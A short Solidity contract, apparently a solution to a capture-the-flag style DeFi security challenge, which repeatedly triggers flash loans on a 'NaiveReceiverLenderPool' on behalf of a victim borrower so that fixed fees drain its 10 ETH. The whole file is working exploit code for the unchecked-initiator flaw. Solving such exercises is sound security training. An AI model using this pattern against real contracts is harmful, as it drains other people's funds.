// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaiveReceiverAttack {
    address immutable public pool;
    constructor(address _pool) {
        pool = _pool;
    }

    // Unsafe function that uses .call() for convenience. This function really should be reentrancy guarded but its just
    // a helper to exploit the NaiveReceiverLenderPool so I take no precautions.
    function flashLoanMultiple(address borrower) external {
        // This assumes that the borrower has exactly 10 ETH since each floash loan sends 1 ETH to the pool address.
        for (uint256 i; i < 10;) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    borrower,
                    1 // Amount to borrow does not matter, as the flash loan fee is fixed.
                )
            );
            require(success);
            unchecked {
                i++;
            }
        }
    }
}
